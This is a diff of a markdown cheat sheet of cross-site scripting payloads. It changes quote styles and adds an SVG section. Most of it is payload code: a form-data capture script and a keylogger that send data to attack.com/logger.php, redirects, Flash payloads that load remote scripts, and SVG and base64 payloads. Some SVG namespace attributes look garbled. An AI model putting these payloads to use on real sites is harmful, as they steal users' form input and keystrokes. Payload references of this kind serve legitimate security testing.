@@ -21,25 +21,25 @@ Examples of payloads with **JavaScript**:
 
 ```javascript
 Basic Alert Payload:
-<script>alert('XSS')</script>
+<script>alert("XSS")</script>
 
 
 Redirection Payload:
 <script>
-    window.location.href='http://attack.com'
+    window.location.href="http://attack.com"
 </script>
 
 
 Form Data Capture Payload:
 <script>
-    document.location='http://attack.com/logger.php?data=' +    
-    document.getElementById('form_id').value 
+    document.location="http://attack.com/logger.php?data=" +    
+    document.getElementById("form_id").value 
 </script>
 
 Keylogger Payload:
 <script>
     document.onkeypress=function(e){
-        fetch('http://www.attack.com/logger.php?k=' + e.key);
+        fetch("http://www.attack.com/logger.php?k="+ e.key);
     }
 </script>
 
@@ -55,12 +55,58 @@ Examples of payloads with **Flash**:
 ```javascript
 
 Javascript Execution Payload:
-<object data='http://www.attack.com/flash.swf'></object>
+<object data="http://www.attack.com/flash.swf"></object>
 
 Redirection Payload (inside a .swf file):
 getURL("javascript:window.location.href='http://attack.com'");
 
 Remote Code Execution Payload (inside a .swf file):
-load('http://www.attack.com/exploit.js');
+load("http://www.attack.com/exploit.js");
 
 ```
+Example of payload with SVG:
+```javascript
+SVG Payload:
+<svg onload="alert('XSS')"></svg>
+
+
+Alert Execution Payload:
+<svg xmlns="http://www.one.site.org/1999/svg" onload="alert('XSS')"></svg>
+
+
+Malicious Image Inclusion Payload:
+<svg xmlns="http://www.one.site.org/1999/svg">
+<image xlink:href="http://www.attack.com/malicious-image.jpg"/>
+</svg>
+
+
+Script Inclusion Payload in Mouseover Event:
+<svg xmlns="http://www.one.site.org/1999/svg" width="300" height="200">
+    <rect width="100%" height="100%" fill="white"/>
+    <script type="text/javascript">
+        alert('XSS');
+    </script>
+</svg>
+
+
+Text Script Inclusion Payload:
+<svg xmlns="http://www.one.site.org/1999/svg">
+    <text font-family="Arial" font-size="20" x="0"
+     y="20" fill="red">
+        SVG XSS Example
+     </text>
+    <script type="text/javascript">
+        alert('XSS');
+    </script>
+</svg>
+
+
+Script Inclusion Payload in Links (with base64):
+<svg mlns="http://www.one.site.org/1999/svg" xmlns:xlink="http://www.one.site.org/1999/xlink">
+<a xlink:href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="> 
+    Click me
+</a>
+</svg>
+
+```
+
